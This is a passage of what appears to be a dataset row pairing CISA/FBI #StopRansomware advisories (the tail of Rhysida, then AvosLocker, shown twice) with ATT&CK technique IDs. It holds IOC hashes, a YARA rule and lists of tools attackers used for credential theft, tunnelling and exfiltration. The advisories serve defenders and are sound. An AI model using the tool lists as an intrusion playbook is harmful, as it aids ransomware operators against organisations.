The two logs that record PowerShell activity are the PowerShell Windows event log and the PowerShell operational log. FBI, CISA, and the MS-ISAC recommend turning on these two Windows event logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Restrict the use of RDP and other remote desktop services to known user accounts and groups. If RDP is necessary, apply best practices such as,CPG 2.W,:

Implement MFA for privileged accounts using RDP.
Use Remote Credential Guard,14, to protect credentials, particularly domain administrator or other high value accounts.
Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Log RDP login attempts.


Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important as antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Apply the recommendations in CISA's joint Guide to Securing Remote Access Software.



In addition, FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support the enforcement of PoLP (as well as the zero trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backups and their restoration (daily or weekly at minimum). By instituting this practice, organizations limit the severity of disruption to business operations,CPG 2.R,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.
Forward log files to a hardened centralized logging server, preferably on a segmented network,CPG 2.F,. Review logging retention rates, such as for VPNs and network-based logs.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and the MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 6-15).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and the MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

CISA: #StopRansomware
CISA: #StopRansomware Vice Society
CISA: Known Exploited Vulnerabilities Catalog
NIST: CVE-2020-1472
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Rhysida actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other threat actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
REFERENCES

Microsoft: DEV-0832 (Vice Society) Opportunistic Ransomware Campaigns Impacting US Education Sector
FortiGuard Labs: Ransomware Roundup - Rhysida
Microsoft: Security Update Guide - CVE-2020-1472
Microsoft: Master File Table (Local File Systems)
SentinelOne: Rhysida
Secplicity: Scratching the Surface of Rhysida Ransomware
Cisco Talos: What Cisco Talos Knows about the Rhysida Ransomware
SOC Radar: Rhysida Ransomware Threat Profile
Sophos: A Threat Cluster’s Switch from Vice Society to Rhysida
Sophos: Vice Society - Rhysida IOCs (GitHub)
Check Point Research: Rhysida Ransomware - Activity and Ties to Vice Society
Microsoft: Command Line Process Auditing
Microsoft: Audit Process Tracking
Microsoft: Remote Credential Guard

ACKNOWLEDGEMENTS
Sophos contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and the MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and the MS-ISAC.
VERSION HISTORY
November 15, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a
15,"






Actions to take today to mitigate cyber threats from AvosLocker ransomware:




Securing remote access tools
Restricting RDP and other remote desktop services
Securing PowerShell and/or restrict usage
Update software to latest version and apply patching updates regularly







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known IOCs, TTPs, and detection methods associated with the AvosLocker variant identified through FBI investigations as recently as May 2023. AvosLocker operates under a ransomware-as-a-service (RaaS) model. AvosLocker affiliates have compromised organizations across multiple critical infrastructure sectors in the United States, affecting Windows, Linux, and VMware ESXi environments. AvosLocker affiliates compromise organizations’ networks by using legitimate software and open-source remote system administration tools. AvosLocker affiliates then use exfiltration-based data extortion tactics with threats of leaking and/or publishing stolen data.
This joint CSA updates the March 17, 2022, AvosLocker ransomware joint CSA, Indicators of Compromise Associated with AvosLocker ransomware, released by FBI and the Department of the Treasury’s Financial Crimes Enforcement Network (FinCEN). This update includes IOCs and TTPs not included in the previous advisory and a YARA rule FBI developed after analyzing a tool associated with an AvosLocker compromise.
FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of AvosLocker ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-284A #StopRansomware: AvosLocker Ransomware (Update)
(PDF,       528.00 KB
  )


For a downloadable copy of IOCs, see:


AA23-284A STIX XML
(XML,       46.67 KB
  )




AA23-284A STIX JSON
(JSON,       34.50 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
AvosLocker affiliates use legitimate software and open-source tools during ransomware operations, which include exfiltration-based data extortion. Specifically, affiliates use:

Remote system administration tools—Splashtop Streamer, Tactical RMM, PuTTy, AnyDesk, PDQ Deploy, and Atera Agent—as backdoor access vectors [T1133].
Scripts to execute legitimate native Windows tools [T1047], such as PsExec and Nltest.
Open-source networking tunneling tools [T1572] Ligolo[1] and Chisel[2].
Cobalt Strike and Sliver[3] for command and control (C2).
Lazagne and Mimikatz for harvesting credentials [T1555].
FileZilla and Rclone for data exfiltration.
Notepad++, RDP Scanner, and 7zip.

FBI has also observed AvosLocker affiliates:

Use custom PowerShell [T1059.001] and batch (.bat) scripts [T1059.003] for lateral movement, privilege escalation, and disabling antivirus software.
Upload and use custom webshells to enable network access [T1505.003].

For additional TTPs, see joint CSA Indicators of Compromise Associated with AvosLocker Ransomware.
Indicators of Compromise (IOCs)
See Tables 1 and 2 below for IOCs obtained from January 2023–May 2023.

Table 1: Files, Tools, and Hashes as of May 2023


Files and Tools
MD5




psscriptpolicytest_im2hdxqi.g0k.ps1
829f2233a1cd77e9ec7de98596cd8165


psscriptpolicytest_lysyd03n.o10.ps1
6ebd7d7473f0ace3f52c483389cab93f


psscriptpolicytest_1bokrh3l.2nw.ps1
10ef090d2f4c8001faadb0a833d60089


psscriptpolicytest_nvuxllhd.fs4.ps1
8227af68552198a2d42de51cded2ce60


psscriptpolicytest_2by2p21u.4ej.ps1
9d0b3796d1d174080cdfdbd4064bea3a


psscriptpolicytest_te5sbsfv.new.ps1
af31b5a572b3208f81dbf42f6c143f99


psscriptpolicytest_v3etgbxw.bmm.ps1
1892bd45671f17e9f7f63d3ed15e348e


psscriptpolicytest_fqa24ixq.dtc.ps1
cc68eaf36cb90c08308ad0ca3abc17c1


psscriptpolicytest_jzjombgn.sol.ps1
646dc0b7335cffb671ae3dfd1ebefe47


psscriptpolicytest_rdm5qyy1.phg.ps1
609a925fd253e82c80262bad31637f19


psscriptpolicytest_endvm2zz.qlp.ps1
c6a667619fff6cf44f447868d8edd681


psscriptpolicytest_s1mgcgdk.25n.ps1
3222c60b10e5a7c3158fd1cb3f513640


psscriptpolicytest_xnjvzu5o.fta.ps1
90ce10d9aca909a8d2524bc265ef2fa4


psscriptpolicytest_satzbifj.oli.ps1
44a3561fb9e877a2841de36a3698abc0


psscriptpolicytest_grjck50v.nyg.ps1
5cb3f10db11e1795c49ec6273c52b5f1


psscriptpolicytest_0bybivfe.x1t.ps1
122ea6581a36f14ab5ab65475370107e


psscriptpolicytest_bzoicrns.kat.ps1
c82d7be7afdc9f3a0e474f019fb7b0f7


Files and Tools
SHA256


BEACON.PS1
e68f9c3314beee640cc32f08a8532aa8dcda613543c54a83680c21d7cd49ca0f


Encoded PowerShell script
ad5fd10aa2dc82731f3885553763dfd4548651ef3e28c69f77ad035166d63db7  


Encoded PowerShell script
48dd7d519dbb67b7a2bb2747729fc46e5832c30cafe15f76c1dbe3a249e5e731  


Files and Tools
SHA1


PowerShell backdoor
2d1ce0231cf8ff967c36bbfc931f3807ddba765c




Table 2: Email Address and Virtual Currency Wallets


Email Address




keishagrey994@outlook[.]com


Virtual Currency Wallets


a6dedd35ad745641c52d6a9f8da1fb09101d152f01b4b0e85a64d21c2a0845ee


bfacebcafff00b94ad2bff96b718a416c353a4ae223aa47d4202cdbc31e09c92


418748c1862627cf91e829c64df9440d19f67f8a7628471d4b3a6cc5696944dd


bc1qn0u8un00nl6uz6uqrw7p50rg86gjrx492jkwfn



DETECTION
Based on an investigation by an advanced digital forensics group, FBI created the following YARA rule to detect the signature for a file identified as enabling malware. NetMonitor.exe is a malware masquerading as a legitimate process and has the appearance of a legitimate network monitoring tool. This persistence tool sends pings from the network every five minutes. The NetMonitor executable is configured to use an IP address as its command server, and the program communicates with the server over port 443. During the attack, traffic between NetMonitor and the command server is encrypted, where NetMonitor functions like a reverse proxy and allows actors to connect to the tool from outside the victim’s network.
YARA Rule



rule NetMonitor {  meta:    author = ""FBI""    source = ""FBI""    sharing = ""TLP:CLEAR""    status = ""RELEASED""    description = ""Yara rule to detect NetMonitor.exe""    category = ""MALWARE""    creation_date = ""2023-05-05""  strings:    $rc4key = {11 4b 8c dd 65 74 22 c3}    $op0 = {c6 [3] 00 00 05 c6 [3] 00 00 07 83 [3] 00 00 05 0f 85 [4] 83 [3] 00 00 01 75 ?? 8b [2] 4c 8d [2] 4c 8d [3] 00 00 48 8d [3] 00 00 48 8d [3] 00 00 48 89 [3] 48 89 ?? e8}  condition:    uint16(0) == 0x5A4D    and filesize < 50000    and any of them}



MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 3-7 for all referenced threat actor tactics and techniques in this advisory.

Table 3: AvosLocker Affiliates ATT&CK Techniques for Initial Access


Initial Access
 
 




Technique Title
ID
Use


External Remote Services
T1133
AvosLocker affiliates use remote system administration tools—Splashtop Streamer, Tactical RMM, PuTTy, AnyDesk, PDQ Deploy, and Atera Agent—to access backdoor access vectors.




Table 4: AvosLocker Affiliates ATT&CK Techniques for Execution


Execution
 
 




Technique Title
ID
Use


Command and Scripting Interpreter: PowerShell
T1059.001
AvosLocker affiliates use custom PowerShell scripts to enable privilege escalation, lateral movement, and to disable antivirus.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
AvosLocker affiliates use custom .bat scripts to enable privilege escalation, lateral movement, and to disable antivirus. 


Windows Management Instrumentation
T1047
AvosLocker affiliates use legitimate Windows tools, such as PsExec and Nltest in their execution.




Table 5: AvosLocker Affiliates ATT&CK Techniques for Persistence


Persistence
 
 




Technique Title
ID
Use


Server Software Component
T1505.003
AvosLocker affiliates have uploaded and used custom webshells to enable network access.




Table 6: AvosLocker Affiliates ATT&CK Techniques for Credential Access


Credential Access
 
 




Technique Title
ID
Use


Credentials from Password Stores
T1555
AvosLocker affiliates use open-source applications Lazagne and Mimikatz to steal credentials from system stores.




Table 7: AvosLocker Affiliates ATT&CK Techniques for Command and Control


Command and Control
 
 




Technique Title
ID
Use


Protocol Tunneling
T1572
AvosLocker affiliates use open source networking tunneling tools like Ligolo and Chisel.



MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
FBI and CISA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise by AvosLocker ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.



Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
In addition, FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they will not be as severe and/or only have irretrievable data [CPG 2.R]. Recommend organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media such as disk and tape, with one copy kept off-site for disaster recovery.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks, restricting further lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-7).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with AvosLocker affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and  FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.
REFERENCES
[1] GitHub sysdream | ligolo repository[2] GitHub jpillora | chisel repository[3] GitHub BishopFox | sliver repository






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1572', 'T1047', 'T1133', 'T1059.003', 'T1505.003', 'T1059.001', 'T1555'}","






Actions to take today to mitigate cyber threats from AvosLocker ransomware:




Securing remote access tools
Restricting RDP and other remote desktop services
Securing PowerShell and/or restrict usage
Update software to latest version and apply patching updates regularly







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known IOCs, TTPs, and detection methods associated with the AvosLocker variant identified through FBI investigations as recently as May 2023. AvosLocker operates under a ransomware-as-a-service (RaaS) model. AvosLocker affiliates have compromised organizations across multiple critical infrastructure sectors in the United States, affecting Windows, Linux, and VMware ESXi environments. AvosLocker affiliates compromise organizations’ networks by using legitimate software and open-source remote system administration tools. AvosLocker affiliates then use exfiltration-based data extortion tactics with threats of leaking and/or publishing stolen data.
This joint CSA updates the March 17, 2022, AvosLocker ransomware joint CSA, Indicators of Compromise Associated with AvosLocker ransomware, released by FBI and the Department of the Treasury’s Financial Crimes Enforcement Network (FinCEN). This update includes IOCs and TTPs not included in the previous advisory and a YARA rule FBI developed after analyzing a tool associated with an AvosLocker compromise.
FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of AvosLocker ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-284A #StopRansomware: AvosLocker Ransomware (Update)
(PDF,       528.00 KB
  )


For a downloadable copy of IOCs, see:


AA23-284A STIX XML
(XML,       46.67 KB
  )




AA23-284A STIX JSON
(JSON,       34.50 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
AvosLocker affiliates use legitimate software and open-source tools during ransomware operations, which include exfiltration-based data extortion. Specifically, affiliates use:

Remote system administration tools—Splashtop Streamer, Tactical RMM, PuTTy, AnyDesk, PDQ Deploy, and Atera Agent—as backdoor access vectors,.
Scripts to execute legitimate native Windows tools, such as PsExec and Nltest.
Open-source networking tunneling tools, Ligolo,1, and Chisel,2,.
Cobalt Strike and Sliver,3, for command and control (C2).
Lazagne and Mimikatz for harvesting credentials,.
FileZilla and Rclone for data exfiltration.
Notepad++, RDP Scanner, and 7zip.

FBI has also observed AvosLocker affiliates:

Use custom PowerShell, and batch (.bat) scripts, for lateral movement, privilege escalation, and disabling antivirus software.
Upload and use custom webshells to enable network access,.

For additional TTPs, see joint CSA Indicators of Compromise Associated with AvosLocker Ransomware.
Indicators of Compromise (IOCs)
See Tables 1 and 2 below for IOCs obtained from January 2023–May 2023.


DETECTION
Based on an investigation by an advanced digital forensics group, FBI created the following YARA rule to detect the signature for a file identified as enabling malware. NetMonitor.exe is a malware masquerading as a legitimate process and has the appearance of a legitimate network monitoring tool. This persistence tool sends pings from the network every five minutes. The NetMonitor executable is configured to use an IP address as its command server, and the program communicates with the server over port 443. During the attack, traffic between NetMonitor and the command server is encrypted, where NetMonitor functions like a reverse proxy and allows actors to connect to the tool from outside the victim’s network.
YARA Rule

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 3-7 for all referenced threat actor tactics and techniques in this advisory.





MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
FBI and CISA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise by AvosLocker ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.



Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
In addition, FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they will not be as severe and/or only have irretrievable data,CPG 2.R,. Recommend organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media such as disk and tape, with one copy kept off-site for disaster recovery.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks, restricting further lateral movement,CPG 2.F,.
